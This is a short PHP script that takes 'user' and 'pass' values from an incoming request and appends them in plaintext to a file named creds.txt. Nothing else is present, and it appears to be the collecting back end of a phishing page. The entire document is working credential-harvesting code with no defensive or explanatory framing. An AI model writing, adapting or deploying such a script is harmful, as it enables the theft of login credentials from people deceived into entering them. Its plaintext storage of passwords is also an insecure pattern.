<?php

$cred_file = fopen("creds.txt", "a+");

$user = $_REQUEST["user"];
$pass = $_REQUEST["pass"];



if (isset($user, $pass)){

fwrite($cred_file, "$user : $pass \n");

}

fclose($cred_file);



